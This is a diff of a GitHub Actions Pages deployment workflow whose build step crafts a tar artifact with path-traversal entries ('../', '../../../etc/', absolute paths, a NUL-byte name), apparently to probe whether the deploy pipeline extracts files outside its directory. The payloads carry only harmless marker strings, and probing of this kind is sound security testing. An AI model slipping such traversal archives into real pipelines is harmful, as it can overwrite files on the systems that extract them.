@@ -2,7 +2,6 @@ name: Deploy Pages
 on:
   push:
     branches: [main]
-  workflow_dispatch:
 permissions:
   contents: read
   pages: write
@@ -14,37 +13,37 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Build malicious tar
+      - name: Build artifact with weird paths
         run: |
           python3 - <<'PYEOF'
-          import tarfile, io, os
+          import tarfile, io
           tf = tarfile.open('/tmp/artifact.tar', 'w')
-          # Normal entry
           ti = tarfile.TarInfo('index.html')
-          content = b'<h1>Pages Index</h1>\n'
-          ti.size = len(content)
-          tf.addfile(ti, io.BytesIO(content))
-          # Path traversal entry: ../escaped.html
-          ti2 = tarfile.TarInfo('../escaped.html')
-          c2 = b'ESCAPED_DOTDOT\n'
-          ti2.size = len(c2)
-          tf.addfile(ti2, io.BytesIO(c2))
-          # Deep traversal
-          ti3 = tarfile.TarInfo('../../../etc/escaped_deep.html')
-          c3 = b'ESCAPED_DEEP\n'
-          ti3.size = len(c3)
-          tf.addfile(ti3, io.BytesIO(c3))
-          # Absolute path entry
-          ti4 = tarfile.TarInfo('/srv/abs_escape.html')
-          c4 = b'ESCAPED_ABS\n'
-          ti4.size = len(c4)
-          tf.addfile(ti4, io.BytesIO(c4))
+          c = b'<h1>Pages Index</h1>\n'
+          ti.size = len(c); tf.addfile(ti, io.BytesIO(c))
+          
+          # Weird path tricks
+          tests = [
+            ('weird/../escaped.html', b'WEIRD_DOTDOT_INSIDE\n'),
+            ('./normal.html', b'NORMAL\n'),
+            ('a/b/../../../oob.html', b'OUT_OF_BOUNDS\n'),
+            ('//double_slash.html', b'DBLSLASH\n'),
+            ('a//b.html', b'INNER_DBLSLASH\n'),
+            ('NUL\x00file.html', b'NULBYTE\n'),
+            ('./.././escaped2.html', b'COMPLEX\n'),
+          ]
+          for name, content in tests:
+            try:
+              ti = tarfile.TarInfo(name)
+              ti.size = len(content)
+              tf.addfile(ti, io.BytesIO(content))
+              print(f"Added: {name!r}")
+            except Exception as e:
+              print(f"FAIL: {name!r}: {e}")
           tf.close()
           PYEOF
-          ls -la /tmp/artifact.tar
           tar tvf /tmp/artifact.tar
-      - name: Upload manually
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: github-pages
           path: /tmp/artifact.tar
